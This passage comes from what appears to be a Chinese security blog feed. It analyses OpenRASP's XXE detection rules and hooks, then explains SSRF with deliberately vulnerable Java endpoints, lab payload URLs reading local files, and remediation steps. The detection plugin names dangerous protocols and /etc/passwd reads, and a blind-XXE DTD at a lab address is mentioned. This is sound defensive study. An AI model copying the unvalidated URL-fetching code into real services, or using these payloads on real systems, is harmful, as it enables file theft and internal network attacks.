getInvokeStaticSrc(XXEHook.class, <span class="string">&quot;checkXXE&quot;</span>, <span class="string">&quot;$5&quot;</span>, String.class);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;expandSystemId&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/lang/String;Z)Ljava/lang/String;&quot;</span>, src);</span><br><span class="line">insertBefore(ctClass, <span class="string">&quot;setDescription&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;&quot;</span> +</span><br><span class="line">             <span class="string">&quot;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V&quot;</span>, src1);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//checkXXE方法</span></span><br><span class="line"><span class="keyword">if</span> (expandedSystemId != <span class="literal">null</span> &amp;&amp; !XXEHook.getLocalExpandedSystemIds().contains(expandedSystemId)) &#123;</span><br><span class="line">    XXEHook.getLocalExpandedSystemIds().add(expandedSystemId);</span><br><span class="line">    HashMap&lt;String, Object&gt; params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">    params.put(<span class="string">&quot;entity&quot;</span>, expandedSystemId);</span><br><span class="line">    HookHandler.doCheck(CheckParameter.Type.XXE, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="XMLReader实现"><a href="#XMLReader实现" class="headerlink" title="XMLReader实现"></a>XMLReader实现</h3><p>​XMLReader实现XML解析时，OpenRASP对其阻断发生在XMLEntityManager类的expandSystemId方法，还是通过XXEHook.checkXXE方法进行检测。同时，XMLReader解析逻辑发现payload为外部引用“ <a href="http://192.168.1.3:8084/attack.dtd">http://192.168.1.3:8084/attack.dtd</a> ”，会调用connect.getInputStream()，这样会进入OpenRASP对HttpURLConnection类的SSRF检测。</p><p>​这里使用的测试用例是“Blind XXE”payload，虽然，前面的步骤并没有被OpenRASP给block掉，但是，获取外部dtd后，对外部dtd文件的解析仍会继续。当解析到外部dtd文件使用file协议读取文件，这些具体的攻击行为时，OpenRASP仍会把解析内容交给XXEHook.checkXXE方法，产生最终的阻断。</p><p>​这里也能明白，在OpenRASP项目xxe目录下，Disable为前缀的文件，是插桩XML解析不同实现类的hook类，其检测代码只是反射调用这些实现类的setFeature方法，在OpenRASP要求对xxe严格阻断时，配置对DTD禁用。而XXEHook等hook类，包括IBMXmlHook等适配指定中间件的类，才是获取解析内容（SystemId），递交给V8进行检测。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checkXXE:102, XXEHook (com.baidu.openrasp.hook.xxe)</span><br><span class="line">invoke:-1, GeneratedMethodAccessor35 (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">expandSystemId:2004, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">setupCurrentEntity:613, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">determineDocVersion:148, XMLVersionDetector (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">parse:806, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:771, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:141, XMLParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:1213, AbstractSAXParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">xmlReader:31, XXEController (com.bmsk.rasp.controller)</span><br></pre></td></tr></table></figure><h2 id="XXE检测算法"><a href="#XXE检测算法" class="headerlink" title="XXE检测算法"></a>XXE检测算法</h2><p>1.控制变量</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// XXE - 代码安全开关，通过调用相关函数直接禁止外部实体</span></span><br><span class="line"><span class="attr">xxe_disable_entity</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法1 - 禁止外部实体加载（记录日志等同于完全忽略）&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;ignore&#x27;</span>,</span><br><span class="line">    <span class="attr">clazz</span>:  &#123;</span><br><span class="line">        <span class="comment">// com/sun/org/apache/xerces/internal/jaxp/DocumentBuilderFactoryImpl</span></span><br><span class="line">        <span class="attr">java_dom</span>:   <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// org/dom4j/io/SAXReader</span></span><br><span class="line">        <span class="attr">java_dom4j</span>: <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// org/jdom/input/SAXBuilder,org/jdom2/input/SAXBuilder</span></span><br><span class="line">        <span class="attr">java_jdom</span>:  <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// com/sun/org/apache/xerces/internal/jaxp/SAXParserFactoryImpl</span></span><br><span class="line">        <span class="attr">java_sax</span>:   <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// javax/xml/stream/XMLInputFactory</span></span><br><span class="line">        <span class="attr">java_stax</span>:  <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="comment">// XXE - 使用 gopher/ftp/dict/.. 等不常见协议访问外部实体</span></span><br><span class="line"><span class="attr">xxe_protocol</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:   <span class="string">&#x27;算法2 - 使用 ftp:// 等异常协议加载外部实体&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>: <span class="string">&#x27;block&#x27;</span>,</span><br><span class="line">    <span class="attr">protocols</span>: [</span><br><span class="line">        <span class="string">&#x27;ftp&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;dict&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;gopher&#x27;</span>,</span><br><span class="line">        <span class="comment">// &#x27;jar&#x27;, // jenkins下存在误报</span></span><br><span class="line">        <span class="string">&#x27;netdoc&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mailto&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// XXE - 使用 file 协议读取内容，可能误报，默认 log</span></span><br><span class="line"><span class="attr">xxe_file</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>:      <span class="string">&#x27;算法3 - 使用 file:// 协议读取文件&#x27;</span>,</span><br><span class="line">    <span class="attr">reference</span>: <span class="string">&#x27;https://rasp.baidu.com/doc/dev/official.html#case-xxe&#x27;</span>,</span><br><span class="line">    <span class="attr">action</span>:    <span class="string">&#x27;log&#x27;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 记录日志模式: 将所有 block 改为 log</span></span><br><span class="line"><span class="keyword">if</span> (algorithmConfig.<span class="property">meta</span>.<span class="property">all_log</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(algorithmConfig).<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">name</span>) &#123;</span><br><span class="line">        <span class="comment">// XXE 外部实体开关不受影响</span></span><br><span class="line">        <span class="keyword">if</span> (name != <span class="string">&#x27;xxe_disable_entity&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (algorithmConfig[name].<span class="property">action</span> == <span class="string">&#x27;block&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                algorithmConfig[name].<span class="property">action</span> = <span class="string">&#x27;log&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.匹配规则和返回内容</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">plugin.<span class="title function_">register</span>(<span class="string">&#x27;xxe&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line">    plugin.<span class="title function_">log</span>(<span class="string">&#x27;Loading XML entity: &#x27;</span> + params.<span class="property">entity</span>)</span><br><span class="line">        <span class="keyword">return</span> clean</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意: 由于libxml2无法挂钩，所以PHP暂时不支持XXE检测</span></span><br><span class="line">plugin.<span class="title function_">register</span>(<span class="string">&#x27;xxe&#x27;</span>, <span class="keyword">function</span> (<span class="params">params, context</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> server      = context.<span class="property">server</span></span><br><span class="line">        <span class="keyword">var</span> is_win      = server.<span class="property">os</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;Windows&#x27;</span>) != -<span class="number">1</span></span><br><span class="line">        <span class="keyword">var</span> items       = params.<span class="property">entity</span>.<span class="title function_">split</span>(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        <span class="keyword">var</span> parameters  = context.<span class="property">parameter</span> || &#123;&#125;</span><br><span class="line">    <span class="keyword">var</span> header      = context.<span class="property">header</span> || &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (algorithmConfig.<span class="property">xxe_protocol</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 检查 windows + SMB 协议，防止泄露 NTLM 信息</span></span><br><span class="line">        <span class="keyword">if</span> (params.<span class="property">entity</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;\\\\&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">action</span>:     algorithmConfig.<span class="property">xxe_protocol</span>.<span class="property">action</span>,</span><br><span class="line">                <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;XXE - Using dangerous protocol SMB&quot;</span>),</span><br><span class="line">                <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                <span class="attr">algorithm</span>:  <span class="string">&#x27;xxe_protocol&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (items.<span class="property">length</span> &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> protocol = items.<span class="title function_">shift</span>().<span class="title function_">toLowerCase</span>()</span><br><span class="line">            <span class="keyword">var</span> address  = items.<span class="title function_">join</span>(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 拒绝特殊协议</span></span><br><span class="line">            <span class="keyword">if</span> (algorithmConfig.<span class="property">xxe_protocol</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (algorithmConfig.<span class="property">xxe_protocol</span>.<span class="property">protocols</span>.<span class="title function_">indexOf</span>(protocol) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="attr">action</span>:     algorithmConfig.<span class="property">xxe_protocol</span>.<span class="property">action</span>,</span><br><span class="line">                        <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;XXE - Using dangerous protocol %1%&quot;</span>, [protocol]),</span><br><span class="line">                        <span class="attr">confidence</span>: <span class="number">100</span>,</span><br><span class="line">                        <span class="attr">algorithm</span>:  <span class="string">&#x27;xxe_protocol&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// file 协议 + 绝对路径, e.g</span></span><br><span class="line">        <span class="comment">// file:///etc/passwd</span></span><br><span class="line">        <span class="comment">// file:///etc/passwd?a=1#b=2 (仅Java支持)</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 相对路径容易误报, e.g</span></span><br><span class="line">        <span class="comment">// file://xwork.dtd</span></span><br><span class="line">        <span class="keyword">if</span> (algorithmConfig.<span class="property">xxe_file</span>.<span class="property">action</span> != <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (address.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; protocol === <span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (address.<span class="title function_">startsWith</span>(<span class="string">&quot;//&quot;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 去掉file://中的//，两种格式统一逻辑处理</span></span><br><span class="line">                    <span class="comment">// file:/etc/passwd</span></span><br><span class="line">                    <span class="comment">// file:///etc/passwd</span></span><br><span class="line">                    address = address.<span class="title function_">substr</span>(<span class="number">2</span>)</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">var</span> address_lc = address.<span class="title function_">toLowerCase</span>()</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (address_lc.<span class="title function_">indexOf</span>(<span class="string">&quot;../&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="comment">// 使用 ../</span></span><br><span class="line">                        <span class="keyword">return</span> &#123;</span><br><span class="line">                            <span class="attr">action</span>:     algorithmConfig.<span class="property">xxe_file</span>.<span class="property">action</span>,</span><br><span class="line">                            <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;XXE - Accessing file %1% with ../&quot;</span>, [address]),</span><br><span class="line">                            <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                            <span class="attr">algorithm</span>:  <span class="string">&#x27;xxe_file&#x27;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (address_lc.<span class="title function_">indexOf</span>(<span class="string">&quot;#&quot;</span>) !=-<span class="number">1</span> || address_lc.<span class="title function_">indexOf</span>(<span class="string">&quot;?&quot;</span>) !=-<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="attr">action</span>:     algorithmConfig.<span class="property">xxe_file</span>.<span class="property">action</span>,</span><br><span class="line">                        <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;XXE - Using url comment in file path %1%&quot;</span>, [address]),</span><br><span class="line">                        <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                        <span class="attr">algorithm</span>:  <span class="string">&#x27;xxe_file&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_">is_absolute_path</span>(address, is_win) ||</span><br><span class="line">                    address_lc.<span class="title function_">startsWith</span>(<span class="string">&quot;localhost&quot;</span>) ||</span><br><span class="line">                    (is_win &amp;&amp; items.<span class="property">length</span> &gt; <span class="number">2</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 三种情况：</span></span><br><span class="line">                    <span class="comment">// 一般绝对路径 file:/etc/passwd</span></span><br><span class="line">                    <span class="comment">// localhost起始路径 file://localhost/c:/windows/win.ini</span></span><br><span class="line">                    <span class="comment">// 带盘符的windows绝对路径 file:c:/windows/win.ini</span></span><br><span class="line">                    <span class="comment">// 1.0 Rhino 引擎不支持URL对象，考虑到 1.0 用户不多，先简单处理下</span></span><br><span class="line">                    <span class="keyword">var</span> content_type = header[<span class="string">&quot;content-type&quot;</span>] || <span class="string">&quot;&quot;</span></span><br><span class="line">                        <span class="keyword">if</span> (content_type.<span class="title function_">indexOf</span>(<span class="string">&quot;xml&quot;</span>) != -<span class="number">1</span> || <span class="title function_">is_include_in_userinput</span>(parameters, address)) &#123;</span><br><span class="line">                            <span class="comment">// 过滤掉 xml、dtd、xsd</span></span><br><span class="line">                            <span class="keyword">if</span> (! address_lc.<span class="title function_">endsWith</span>(<span class="string">&#x27;.xml&#x27;</span>) &amp;&amp;</span><br><span class="line">                                ! address_lc.<span class="title function_">endsWith</span>(<span class="string">&#x27;.xsd&#x27;</span>) &amp;&amp;</span><br><span class="line">                                ! address_lc.<span class="title function_">endsWith</span>(<span class="string">&#x27;.dtd&#x27;</span>))</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">return</span> &#123;</span><br><span class="line">                                    <span class="attr">action</span>:     algorithmConfig.<span class="property">xxe_file</span>.<span class="property">action</span>,</span><br><span class="line">                                    <span class="attr">message</span>:    <span class="title function_">_</span>(<span class="string">&quot;XXE - Accessing file %1%&quot;</span>, [address]),</span><br><span class="line">                                    <span class="attr">confidence</span>: <span class="number">90</span>,</span><br><span class="line">                                    <span class="attr">algorithm</span>:  <span class="string">&#x27;xxe_file&#x27;</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clean</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>《Java代码审计-入门篇》和《Java代码审计实战》</span><br><span class="line"><span class="number">2.</span>官方文档 Hook函数列表 和 功能说明</span><br><span class="line">https:<span class="comment">//rasp.baidu.com/doc/hacking/architect/hook.html</span></span><br><span class="line">https:<span class="comment">//rasp.baidu.com/doc/usage/main.html</span></span><br><span class="line"><span class="number">3.</span>Java Sec Code靶场</span><br><span class="line">https:<span class="comment">//github.com/JoyChou93/java-sec-code</span></span><br><span class="line"><span class="number">4.</span>WEB安全&amp;JAVA代码审计：XXE外部实体注入</span><br><span class="line">    https:<span class="comment">//www.freebuf.com/articles/web/318984.html</span></span><br><span class="line"><span class="number">5.</span>XML中实体的概念</span><br><span class="line">    https:<span class="comment">//blog.csdn.net/janchin/article/details/46849209</span></span><br><span class="line"><span class="number">6.</span>盲XXE攻击 -带外交互技术(OAST) 泄露数据</span><br><span class="line">    https:<span class="comment">//xz.aliyun.com/t/9519#toc-5</span></span><br><span class="line"><span class="number">7.</span>XXE从入门到放弃</span><br><span class="line">    https:<span class="comment">//www.anquanke.com/post/id/197423#h3-4%22%20/h</span></span><br><span class="line"><span class="number">8.</span>一篇文章带你深入理解漏洞之 XXE 漏洞</span><br><span class="line">    https:<span class="comment">//xz.aliyun.com/t/3357</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenRASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenRASP-SSRF漏洞</title>
      <link href="/2022/12/22/OpenRASP-SSRF%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/12/22/OpenRASP-SSRF%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenRASP-SSRF漏洞"><a href="#OpenRASP-SSRF漏洞" class="headerlink" title="OpenRASP-SSRF漏洞"></a>OpenRASP-SSRF漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>​SSRF（Server-Side Request Forge，服务端伪造请求），漏洞原理为，服务端提供了从其他服务器应用获取数据的功能且没有对目标地址和传入命令进行过滤与限制造成的，如常见的从指定URL加载图片、文本资源或者获取指定页面的网页内容等。</p><p>​攻击者首先向可直接访问的Web站点发送攻击载荷，该攻击载荷的攻击对象为内部网络，然后，Web站点作为“中间人”，将包含有恶意攻击请求的请求传递给内部网络，内部网络接受请求并处理后，将结果返回给Web站点。最后，Web站点将内部网络返回的结果传递给攻击者，以此达到攻击内部网络的目的。</p><p>​利用SSRF漏洞能实现的事情有：扫描内网、向内网任意主机的任意端口发送恶意请求、攻击内网Web应用、读取文件以及拒绝服务攻击等。Java中的SSRF利用有局限性，一般利用http&#x2F;https协议来探测端口、暴力穷举等，还可以通过file协议读取&#x2F;下载任意文件。</p><blockquote><p>file协议：也叫本地文件传输协议，主要用于访问本地计算机中的文件，url格式为“file:&#x2F;&#x2F;&#x2F;C:&#x2F;Users&#x2F;bmsk&#x2F;Desktop&#x2F;017-xss.jsp”。</p><p>file协议只能在本地访问，file无法实现跨域，file协议对应有一个类似http的远程访问，就是ftp协议，即文件传输协议。本地搭建http服务器开放端口后他人也可以通过http访问到你电脑中的文件，但是file协议做不到。所以file协议三道杠没有host名。</p></blockquote><h2 id="业务代码"><a href="#业务代码" class="headerlink" title="业务代码"></a>业务代码</h2><p>​启动一个http服务器作为攻击目标：python38 -m http.server –bind 127.0.0.1 8090。</p><h3 id="1-URLConnection实现"><a href="#1-URLConnection实现" class="headerlink" title="1.URLConnection实现"></a>1.URLConnection实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//URlConnection是一个抽象类，有两个直接子类，分别是HttpURLConnection和JarURLConnection。</span></span><br><span class="line"><span class="comment">//默认情况下，URLConnection的传参没有有效控制时会引起SSRF漏洞。</span></span><br><span class="line"><span class="comment">//下面代码中，如果将urlConnection变量，强制转型为HttpURLConnection，则无法利用file协议的SSRF漏洞。即代码凡是带http都只支持http、https协议；</span></span><br><span class="line"><span class="type">HttpURLConnection</span> <span class="variable">httpUrl</span> <span class="operator">=</span> (HttpURLConnection)urlConnection;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="meta">@RequestMapping(&quot;ssrf&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ssrf</span><span class="params">(String url, HttpServletResponse response)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">URLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> u.openConnection();</span><br><span class="line">        <span class="comment">//HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;直接替换下面urlConnection为httpUrl。</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(urlConnection.getInputStream(),<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">html</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        String htmlContent;</span><br><span class="line">        <span class="keyword">while</span> ((htmlContent = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            html.append(htmlContent);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="type">ServletOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">        os.write(html.toString().getBytes());</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        System.out.println(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//payload</span></span><br><span class="line">http:<span class="comment">//127.0.0.1:8083/ssrf?url=http://127.0.0.1:8090/1.txt</span></span><br><span class="line">http:<span class="comment">//127.0.0.1:8083/ssrf?url=file:///D:/TargetDir/1.txt</span></span><br></pre></td></tr></table></figure><h3 id="2-HttpClient实现"><a href="#2-HttpClient实现" class="headerlink" title="2.HttpClient实现"></a>2.HttpClient实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入依赖</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;httpclient&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.5</span><span class="number">.14</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//HttpClient提供了支持HTTP协议的客户端编程工具包，但显然这种写法不支持file协议</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;httpClient&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ssrfClient</span><span class="params">(String url,HttpServletResponse response)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">HttpClient</span> <span class="variable">client</span> <span class="operator">=</span> HttpClients.createDefault();</span><br><span class="line">        <span class="type">HttpGet</span> <span class="variable">httpGet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">        <span class="type">HttpResponse</span> <span class="variable">res</span> <span class="operator">=</span> client.execute(httpGet);</span><br><span class="line">        <span class="comment">// 读取服务器响应数据</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(res.getEntity().getContent()));</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">resultBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        String temp=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> ((temp = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            resultBuffer.append(temp);</span><br><span class="line">        &#125;</span><br><span class="line">        br.close();</span><br><span class="line">        <span class="type">ServletOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">        os.write(resultBuffer.toString().getBytes());</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        System.out.println(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">//payload</span></span><br><span class="line">http:<span class="comment">//127.0.0.1:8083/httpClient?url=http://127.0.0.1:8090/1.txt</span></span><br></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>​SSRF漏洞审计，通常可以从一些http请求函数入手。修复方式考虑以下几种，总结为增加权限、统一错误信息、限制域名IP端口协议等内容、设置访问白名单：</p><ul><li>增加访问权限。</li><li>限制请求的端口为http常用端口，比如80、443、8080、8090等。</li><li>同意错误信息，避免根据错误信息远端服务器的端口状态。</li><li>根据业务需求，判定所需的域名是否是常用的几个，若是，则将这几个特定域名加入白名单，并拒绝白名单域名之外的请求。</li><li>禁用不需要的协议，仅仅允许http和https请求。</li><li>根据请求来源，判定请求地址是否是固定请求来源，若是，则将这几个特定域名&#x2F;IP添加到白名单，并拒绝白名单域名&#x2F;IP之外的请求。</li><li>若业务需求和请求来源并不固定，则可编写函数，检测特定域名、判断是否是内网IP、判断是否为http&#x2F;https协议等。</li></ul><h2 id="OpenRASP检测流程"><a href="#OpenRASP检测流程" class="headerlink" title="OpenRASP检测流程"></a>OpenRASP检测流程</h2><p>远程调试：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -javaagent:D:\javaProject\testRASP\target\rasp\rasp.jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9193 -jar rasp-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure><p>以agent方式启动springboot项目：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -javaagent:D:\javaProject\testRASP\target\rasp\rasp.jar -jar rasp-0.0.1-SNAPSHOT.jar(springboot项目.jar)</span><br></pre></td></tr></table></figure><h3 id="HttpClientHook"><a href="#HttpClientHook" class="headerlink" title="HttpClientHook"></a>HttpClientHook</h3><p>应用类：org&#x2F;apache&#x2F;http&#x2F;impl&#x2F;client&#x2F;CloseableHttpClient、org&#x2F;apache&#x2F;http&#x2F;impl&#x2F;client&#x2F;AutoRetryHttpClient、org&#x2F;apache&#x2F;http&#x2F;impl&#x2F;client&#x2F;DecompressingHttpClient、org&#x2F;apache&#x2F;http&#x2F;impl&#x2F;client&#x2F;AbstractHttpClient</p><p>hook类：HttpClientHook</p><p>​hookMethod考虑到http client的不同版本，从接口角度进行匹配，只有实现了HttpClient接口（感觉isClassMatched已经做到），才会对该拦截类插桩。</p><p>​进一步考虑到client.execute方法的多态性，根据方法签名（即形参+返回值）的不同调用检测代码checkHttpHost或checkHttpUri，这两个方法逻辑一致，都是从应用类方法execute的形参HttpUriRequest或形参HttpHost提取出url、hostname、function（即参数，requestmapping）、port、ip信息，传递给HookHandler.doCheck进入检测逻辑。SSRF漏洞的检测，仍交给V8AttackChecker去做。</p><p>​上述检测代码checkHttpHost或checkHttpUri被插桩在client.execute方法执行前，而exitCheck被插桩在client.execute方法执行执行后，被传入的参数是execute的第一个形参和返回值。在我的测试中，checkHttpHost就已经阻断对“ <a href="http://127.0.0.1:8090/1.txt">http://127.0.0.1:8090/1.txt</a> ”的访问，进入exitCheck方法时response为null，从而跳过该检测。exitCheck方法，从线程私有变量uriCache提取出重定向url，将本次请求url和重定向url同时放入params，并交给HookHandler.doCheck进入V8检测。</p><p>​（这部分比较迷，什么情况下会出现重定向还是没看懂…业务代码本身不就是对新url的访问？）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//位于HttpClientHook的hookMethod方法</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title 